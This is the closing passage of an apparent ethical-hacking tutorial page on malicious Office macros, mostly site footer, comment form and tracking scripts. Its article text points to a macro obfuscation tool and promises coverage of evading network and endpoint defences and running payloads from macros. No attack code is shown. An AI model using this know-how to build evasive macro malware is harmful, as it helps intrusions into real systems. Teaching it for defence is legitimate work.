+<li>https://github.com/Pepitoh/Vbad</li>
+</ul>
+<p>Later in the tutorial, we will dedicate a whole module to evading network-based and endpoint-based defences. We have barely scratched the surface as far as custom macro development is concerned; the author&rsquo;s imagination is the only limit to malicious macro development. </p>
+<p>We chose to illustrate some macro malware cases to demonstrate how Visual Basic for Applications, PowerShell, WMI Scripting and Windows Script Host are being used by malware authors. </p>
+<p>Leveraging the abovementioned technologies and the various techniques we have covered so far can give near-endless possibilities of payload execution from inside a macro.</p>
+            </div>
+        </div>
+	</div>
+	
+
+	<!---- CONTENT FOOTER START ---->
+<footer class="content-footer">
+     <div class="row navigation">
+        <div class="col-sm-1 d-flex align-items-center">
+            
+                <a href="../ffmpeg-cheat-sheet.html" class="fooarrow-left me-4"><i class="fa fa-angle-left" aria-hidden="true"></i></a>
+            
+	</div>
+        <div class="col-sm-4">
+            
+            <div class="text-end d-flex align-items-center">
+                <a class="h5" href="../ffmpeg-cheat-sheet.html">FFmpeg Cheat Sheet</a>
+            </div>
+            
+        </div>
+        <div class="col-sm-2">
+        </div>
+	<div class="col-sm-4">
+            
+            <div class="text-start d-flex align-items-center">
+                <a class="h5" href="../web-security-headers.html">Web Security Headers</a>
+            </div>
+            
+        </div>
+        <div class="col-sm-1 d-flex align-items-center">
+            
+                <a href="../web-security-headers.html" class="fooarrow-right ms-4"><i class="fa fa-angle-right" aria-hidden="true"></i></a>
+            
+	</div>
+    </div>
+    <script>
+        var keymap = {};
+        keymap[ 37 ] = ".fooarrow-left";
+        keymap[ 39 ] = ".fooarrow-right";
+
+        $( document ).on( "keyup", function( event ) {
+            var selector = keymap[ event.which ];
+            if ( selector ) {
+                href = $( selector ).attr( "href" );
+                window.location = href;
+             }
+         });
+    </script>
+</footer>
+<!----  CONTENT FOOTER END  ---->
+
+
+</div>
+<!----  ARTICLE END  ---->
+
+
+
+
+
+<!---- COMMENT FORM START ---->
+<div class="my-5 row">
+    <div class="col-sm-4 social-login">
+        <img id="my-avatar" class="mb-3" src="../../static/images/anonymous_avatar.png" alt="" title="" height=96 width=96>
+        
+        <h3>Anonymous</h3>
+        <hr>
+        <p>You're not logged in; your comment will be anonymous.</p>
+        <p>Log in <a href="../../accounts/login/index.html">here</a> to post from your account, or via your social media account:</p>
+	    <div class="social-icon">
+<a href="https://www.youtube.com/c/EvilSaintEthicalHacking">
+    <i class="fab fa-youtube"></i>
+</a>
+<a href="https://www.facebook.com/TheEvilSaint/">
+    <i class="fab fa-facebook"></i>
+</a>
+<a href="https://www.twitter.com/_evilsaint_/">
+    <i class="fab fa-twitter"></i>
+</a>
+<a href="https://www.instagram.com/therealevilsaint/">
+    <i class="fab fa-instagram"></i>
+</a>
+</div>
+        
+    </div>
+    <div class="col-sm-8">
+        
+
+
+<form class="comments-form" method="POST" action="http://evilsaint.com/comments/post/" onsubmit="post.disabled = true; return true;">
+    <input type="hidden" name="csrfmiddlewaretoken" value="ET9YXVr5xDDWpKHRLLMiGrKIF5o1EH9WlLhXEQ32g7U9QNiNkxTBiqieJAvG1MHt">
+    
+    <fieldset>
+        <input type="hidden" name="next" value="/comments/sent/" />
+        <div class="alert alert-danger" data-comment-element="errors" hidden></div>
+        
+            
+        <div><input type="hidden" name="content_type" value="article.article" id="id_content_type"></div>
+            
+        
+            
+        <div><input type="hidden" name="object_pk" value="21" id="id_object_pk"></div>
+            
+        
+            
+        <div><input type="hidden" name="timestamp" value="1672015109" id="id_timestamp"></div>
+            
+        
+            
+        <div><input type="hidden" name="security_hash" value="78e159264554a49c1d02c08838c1e1feed98842c" id="id_security_hash"></div>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        <div><input type="hidden" name="reply_to" value="0" id="id_reply_to"></div>
+            
+        
+            
+        
+        
+            <input type="text" name="name" value="Anonymous" placeholder="Name" class="commentinp form-control" required id="id_name">
+            <input type="email" name="email" class="commentinp form-control" placeholder="E-mail" type="email" id="id_email">
+        
+        <div style="display:none"><input type="text" name="honeypot" id="id_honeypot"></div>
+        <textarea name="comment" placeholder="Comment" class="form-control mb-2" col="40" rows="6" style="width:98%;" required id="id_comment">
+</textarea>
+        <div class="d-flex flex-wrap">
+            <p class="mb-1 mt-2"><b>Captcha:</b> What's the standard TCP port of the following service?</p>
+            <img class="captcha me-2" src="../../captcha/image/2d39cc37e5b3f73461a2508414db99ddf2689a09/index.html" alt="captcha"><input type="hidden" name="captcha_0" value="2d39cc37e5b3f73461a2508414db99ddf2689a09" required id="id_captcha_0"><input type="text" name="captcha_1" required id="id_captcha_1" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false">
+        </div>
+    </fieldset>
+    <div class="mt-4">
+        <input class="btn btn-outline-light" type="submit" name="post" value="Send"/>
+        <input class="btn btn-outline-light" type="submit" name="preview" value="Preview"/>
+    </div>
+    
+</form>
+
+    </div>
+</div>
+<div class="row">
+    <div class="col-sm-12">
+        
+        <h2 class="mb-4">0 comments</h2>
+    </div>
+    <div class="col-sm-12 mb-5">
+        
+
+
+
+
+
+
+    </div>
+</div>
+<script src="../../static/js/avatar_choice.js"></script>
+<!----  COMMENT FORM END  ---->
+
+
+</div>
+
+                    <!----  MIDDLE CONTENT GRID END  ---->
+                    
+<div class="col-1">
+    
+
+<a href="index.html#" class="back-to-top">
+    <img src="../../static/images/backtotop.png" title="Back to top">
+</a>
+<script>
+(function(factory){if(typeof define==="function"&&define.amd){define(["jquery"],function($){return factory($)})}else if(typeof module==="object"&&typeof module.exports==="object"){exports=factory(require("jquery"))}else{factory(jQuery)}})(function($){$.easing.jswing=$.easing.swing;var pow=Math.pow,sqrt=Math.sqrt,sin=Math.sin,cos=Math.cos,PI=Math.PI,c1=1.70158,c2=c1*1.525,c3=c1+1,c4=2*PI/3,c5=2*PI/4.5;function bounceOut(x){var n1=7.5625,d1=2.75;if(x<1/d1){return n1*x*x}else if(x<2/d1){return n1*(x-=1.5/d1)*x+.75}else if(x<2.5/d1){return n1*(x-=2.25/d1)*x+.9375}else{return n1*(x-=2.625/d1)*x+.984375}}$.extend($.easing,{def:"easeOutQuad",swing:function(x){return $.easing[$.easing.def](x)},easeInQuad:function(x){return x*x},easeOutQuad:function(x){return 1-(1-x)*(1-x)},easeInOutQuad:function(x){return x<.5?2*x*x:1-pow(-2*x+2,2)/2},easeInCubic:function(x){return x*x*x},easeOutCubic:function(x){return 1-pow(1-x,3)},easeInOutCubic:function(x){return x<.5?4*x*x*x:1-pow(-2*x+2,3)/2},easeInQuart:function(x){return x*x*x*x},easeOutQuart:function(x){return 1-pow(1-x,4)},easeInOutQuart:function(x){return x<.5?8*x*x*x*x:1-pow(-2*x+2,4)/2},easeInQuint:function(x){return x*x*x*x*x},easeOutQuint:function(x){return 1-pow(1-x,5)},easeInOutQuint:function(x){return x<.5?16*x*x*x*x*x:1-pow(-2*x+2,5)/2},easeInSine:function(x){return 1-cos(x*PI/2)},easeOutSine:function(x){return sin(x*PI/2)},easeInOutSine:function(x){return-(cos(PI*x)-1)/2},easeInExpo:function(x){return x===0?0:pow(2,10*x-10)},easeOutExpo:function(x){return x===1?1:1-pow(2,-10*x)},easeInOutExpo:function(x){return x===0?0:x===1?1:x<.5?pow(2,20*x-10)/2:(2-pow(2,-20*x+10))/2},easeInCirc:function(x){return 1-sqrt(1-pow(x,2))},easeOutCirc:function(x){return sqrt(1-pow(x-1,2))},easeInOutCirc:function(x){return x<.5?(1-sqrt(1-pow(2*x,2)))/2:(sqrt(1-pow(-2*x+2,2))+1)/2},easeInElastic:function(x){return x===0?0:x===1?1:-pow(2,10*x-10)*sin((x*10-10.75)*c4)},easeOutElastic:function(x){return x===0?0:x===1?1:pow(2,-10*x)*sin((x*10-.75)*c4)+1},easeInOutElastic:function(x){return x===0?0:x===1?1:x<.5?-(pow(2,20*x-10)*sin((20*x-11.125)*c5))/2:pow(2,-20*x+10)*sin((20*x-11.125)*c5)/2+1},easeInBack:function(x){return c3*x*x*x-c1*x*x},easeOutBack:function(x){return 1+c3*pow(x-1,3)+c1*pow(x-1,2)},easeInOutBack:function(x){return x<.5?pow(2*x,2)*((c2+1)*2*x-c2)/2:(pow(2*x-2,2)*((c2+1)*(x*2-2)+c2)+2)/2},easeInBounce:function(x){return 1-bounceOut(1-x)},easeOutBounce:bounceOut,easeInOutBounce:function(x){return x<.5?(1-bounceOut(1-2*x))/2:(1+bounceOut(2*x-1))/2}})});
+
+    $( document ).ready(
+        function() {
+            $( window ).scroll(
+                function() {
+                    if ( $( this ).scrollTop() > 100 ) {
+                        $( ".back-to-top" ).fadeIn( "slow" );
+                    } else {
+                        $( ".back-to-top" ).fadeOut( "slow" );
+                    }
+                }
+            );
+
+            $( ".back-to-top" ).click(
+                function() {
+                    $( "html, body" ).animate(
+                        { scrollTop: 0 },
+                        1500,
+                        "easeInOutExpo"
+                    );
+
+                    return false;
+                }
+            );
+        }
+    );
+</script>
+
+</div>
+
+				</div>
+			</div>
+		</div>
+        <!----  RIGHT CONTENT END  ---->
+	</div>
+</div>
+<script src="../../static/js/bootstrap.bundle.min.js"></script>
+<script src="../../static/js/bootstrap.min.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-KK5XXRT4LD"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-KK5XXRT4LD');
+</script>
+<!-- Facebook Pixel Code -->
+<script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '375149543983139');
+  fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=375149543983139&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Facebook Pixel Code -->
+
+</body>
+</html>
